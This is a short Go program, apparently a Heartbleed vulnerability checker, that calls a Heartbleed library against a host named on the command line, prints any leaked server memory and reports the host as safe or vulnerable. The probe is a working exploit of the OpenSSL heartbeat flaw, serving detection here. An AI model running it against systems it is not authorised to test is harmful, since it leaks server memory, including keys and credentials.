//+build skip

package main

import (
	bleed "github.com/FiloSottile/Heartbleed/bleed"
	"log"
	"os"
)

func main() {
	out, err := bleed.Heartbleed(os.Args[1], []byte("YELLOW SUBMARINE"))
	if err == bleed.ErrPayloadNotFound {
		log.Printf("%v - SAFE", os.Args[1])
		os.Exit(1)
	} else if err != nil {
		log.Printf("%v - ERROR: %v", os.Args[1], err)
		os.Exit(2)
	} else {
		log.Printf("%v\n", string(out))
		log.Printf("%v - VULNERABLE", os.Args[1])
		os.Exit(0)
	}
}
